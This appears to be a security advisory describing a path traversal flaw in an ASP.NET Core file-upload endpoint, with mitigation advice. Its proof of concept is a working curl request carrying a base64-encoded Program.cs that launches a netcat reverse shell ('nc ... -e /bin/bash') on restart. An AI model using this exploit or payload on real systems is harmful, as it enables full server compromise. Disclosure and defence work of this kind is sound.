
# Path Traversal Vulnerability Leading to Arbitrary Code Execution

## Summary
The application allows users to upload files, which there is a possiblity that they're saved in the `wwwroot/images` directory. In this case, due to insufficient validation of the uploaded file names, an attacker can exploit a path traversal vulnerability by uploading a file with a crafted name (e.g., `../../Program.cs`). This allows the attacker to overwrite critical application files. In this instance, the attacker overwrites `Program.cs` to include a reverse shell payload, leading to arbitrary code execution upon the application's restart.

## Vulnerability Details

**Vulnerable Component:** File upload functionality handling user-supplied file names.

**Attack Vector:** An attacker uploads a file with a name containing path traversal sequences (e.g., `../../Program.cs`). The application saves this file in the `wwwroot/images` directory without sanitizing the file name, resulting in the overwriting of files outside the intended directory.

**Impact:** By overwriting `Program.cs`, the attacker injects malicious code that establishes a reverse shell connection when the application is restarted, leading to full compromise of the server.

## Proof of Concept

- The malicious `Program.cs` file is located in this directory, stored under the name `PathTraversalPoc.cs`.
- By the request below, the attacker can upload the malicous `Program.cs` file:
``` bash
curl -X 'POST' \
  'https://localhost:7037/api/UploadFile' \
  -H 'accept: text/plain' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "../../Program.cs",
  "binaryContent": "dXNpbmcgTWljcm9zb2Z0LkVudGl0eUZyYW1ld29ya0NvcmU7CnVzaW5nIEZpbGVzLk1vZGVsczsKdXNpbmcgRmlsZXMuU2VydmljZXM7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKdXNpbmcgU3lzdGVtLlRocmVhZGluZy5UYXNrczsKCnZhciBidWlsZGVyID0gV2ViQXBwbGljYXRpb24uQ3JlYXRlQnVpbGRlcihhcmdzKTsKCi8vIEFkZCBzZXJ2aWNlcyB0byB0aGUgY29udGFpbmVyLgoKYnVpbGRlci5TZXJ2aWNlcy5BZGRDb250cm9sbGVycygpOwovLyBMZWFybiBtb3JlIGFib3V0IGNvbmZpZ3VyaW5nIFN3YWdnZXIvT3BlbkFQSSBhdCBodHRwczovL2FrYS5tcy9hc3BuZXRjb3JlL3N3YXNoYnVja2xlCmJ1aWxkZXIuU2VydmljZXMuQWRkRGJDb250ZXh0PEZpbGVDb250ZXh0PihvcHRpb25zID0+IG9wdGlvbnMuVXNlSW5NZW1vcnlEYXRhYmFzZSgiRmlsZXMiKSk7CmJ1aWxkZXIuU2VydmljZXMuQWRkU2NvcGVkPEZpbGVTZXJ2aWNlPigpOwpidWlsZGVyLlNlcnZpY2VzLkFkZEVuZHBvaW50c0FwaUV4cGxvcmVyKCk7CmJ1aWxkZXIuU2VydmljZXMuQWRkU3dhZ2dlckdlbigpOwoKdmFyIGFwcCA9IGJ1aWxkZXIuQnVpbGQoKTsKCi8vIENvbmZpZ3VyZSB0aGUgSFRUUCByZXF1ZXN0IHBpcGVsaW5lLgppZiAoYXBwLkVudmlyb25tZW50LklzRGV2ZWxvcG1lbnQoKSkKewogICAgYXBwLlVzZVN3YWdnZXIoKTsKICAgIGFwcC5Vc2VTd2FnZ2VyVUkoKTsKfQoKYXBwLlVzZUh0dHBzUmVkaXJlY3Rpb24oKTsKCmFwcC5Vc2VBdXRob3JpemF0aW9uKCk7CgphcHAuTWFwQ29udHJvbGxlcnMoKTsKCi8vIERlZmluaW5nIGEgc2hlbGwgZXhlY3V0aW9uIGZ1bmN0aW9uCmFzeW5jIFRhc2sgRXhlY3V0ZVNoZWxsQ29tbWFuZEFzeW5jKHN0cmluZyBjb21tYW5kLCBzdHJpbmcgYXJndW1lbnRzKQp7CiAgICB2YXIgcHJvY2Vzc0luZm8gPSBuZXcgUHJvY2Vzc1N0YXJ0SW5mbwogICAgewogICAgICAgIEZpbGVOYW1lID0gY29tbWFuZCwKICAgICAgICBBcmd1bWVudHMgPSBhcmd1bWVudHMsCiAgICAgICAgUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWUsCiAgICAgICAgUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZSwKICAgICAgICBVc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZSwKICAgICAgICBDcmVhdGVOb1dpbmRvdyA9IHRydWUKICAgIH07CgogICAgdHJ5CiAgICB7CiAgICAgICAgdXNpbmcgKHZhciBwcm9jZXNzID0gbmV3IFByb2Nlc3MgeyBTdGFydEluZm8gPSBwcm9jZXNzSW5mbyB9KQogICAgICAgIHsKICAgICAgICAgICAgcHJvY2Vzcy5TdGFydCgpOwoKICAgICAgICAgICAgLy8gUmVhZCBvdXRwdXQgYW5kIGVycm9yIHN0cmVhbXMgYXN5bmNocm9ub3VzbHkgKG9wdGlvbmFsKQogICAgICAgICAgICBzdHJpbmcgb3V0cHV0ID0gYXdhaXQgcHJvY2Vzcy5TdGFuZGFyZE91dHB1dC5SZWFkVG9FbmRBc3luYygpOwogICAgICAgICAgICBzdHJpbmcgZXJyb3IgPSBhd2FpdCBwcm9jZXNzLlN0YW5kYXJkRXJyb3IuUmVhZFRvRW5kQXN5bmMoKTsKCiAgICAgICAgICAgIC8vIFdhaXQgZm9yIHRoZSBwcm9jZXNzIHRvIGV4aXQgYXN5bmNocm9ub3VzbHkKICAgICAgICAgICAgYXdhaXQgcHJvY2Vzcy5XYWl0Rm9yRXhpdEFzeW5jKCk7CiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCkKICAgIHsKICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiRXJyb3IgZXhlY3V0aW5nIHNoZWxsIGNvbW1hbmQ6ICIgKyBleC5NZXNzYWdlKTsKICAgIH0KfQoKLy8gR2V0dGluZyByZXZlcnNlIHNoZWxsIHVzaW5nIG5ldGNhdCBjb21tYW5kCl8gPSBUYXNrLlJ1bigoKSA9PiBFeGVjdXRlU2hlbGxDb21tYW5kQXN5bmMoIm5jIiwgIjEyNy4wLjAuMSA0NDMyIC1lIC9iaW4vYmFzaCIpKTsKCmFwcC5SdW4oKTs="
}'
```
- Upon the next restart, the application executes the injected code, establishing a reverse shell connection to the attacker's machine.

## Mitigation Recommendations

**Sanitize File Names:** Implement validation to remove or neutralize path traversal sequences from user-supplied file names. 

**Restrict File Upload Paths:** Ensure that uploaded files are saved only within designated directories by combining the target directory path with the sanitized file name. Additionally, verify that the resulting path is within the intended directory.

**Limit File Permissions:** Configure the application to run with the least privileges necessary, reducing the potential impact of an exploit. For example, ensure that the application does not have permission to overwrite critical system or application files.

**Regular Security Audits:** Conduct periodic security assessments to identify and remediate vulnerabilities related to file handling and other user inputs. This includes code reviews and penetration testing to uncover potential security weaknesses.

## References

[Mitigating Path Traversal Attacks in .NET: A Guide](https://www.stackhawk.com/blog/net-path-traversal-guide-examples-and-prevention/)

[Path.Combine Security Issues in ASP.NET Applications](https://www.praetorian.com/blog/pathcombine-security-issues-in-aspnet-applications/)

[How to prevent path traversal in ASP.NET Core](https://learn.microsoft.com/en-us/answers/questions/933973/how-to-prevent-of-path-traversal-in-asp-net-core)